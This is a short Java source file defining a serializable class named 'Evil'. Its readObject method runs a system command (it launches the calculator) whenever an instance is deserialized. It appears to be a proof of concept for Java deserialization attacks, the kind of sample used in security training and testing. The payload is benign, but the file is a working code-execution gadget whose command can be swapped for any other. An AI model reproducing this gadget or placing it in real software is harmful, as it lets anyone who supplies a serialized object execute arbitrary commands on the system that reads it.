package org.example;

import java.io.IOException;
import java.io.Serializable;

public class Evil implements Serializable {
    private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException {
    }
    private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("Calc");
    }
}
